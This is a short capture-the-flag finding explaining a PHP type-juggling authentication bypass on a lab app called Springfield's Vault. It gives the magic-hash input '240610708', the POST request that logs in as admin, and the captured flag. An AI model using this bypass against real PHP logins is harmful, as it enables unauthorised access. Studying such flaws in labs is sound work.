findings.title: PHP Magic Hash Authentication Bypass (Type Juggling)
findings.description: The Springfield's Vault application uses PHP's loose comparison operator (==) to verify the admin password. The stored hash is 0e678703625362188185747119782643 — a 'magic hash' that PHP interprets as 0 in scientific notation. Any MD5 hash that also starts with '0e' followed only by digits evaluates to 0 under loose comparison, allowing authentication bypass without knowing the real password. Password '240610708' has MD5 hash 0e462097431906509019562988736854, which PHP treats as equal to the stored hash.
findings.evidence:
POST /index.php with password=240610708
Server responded with: Welcome Admin
CTF Flag: flag{b9d4ad78-52b8-4e0b-8e96-01653394513e}

Explanation:
  Stored hash: 0e678703625362188185747119782643
  Magic password: 240610708
  MD5('240610708') = 0e462097431906509019562988736854
  PHP: '0e678703...' == '0e462097...' => 0 == 0 => TRUE (type juggling)
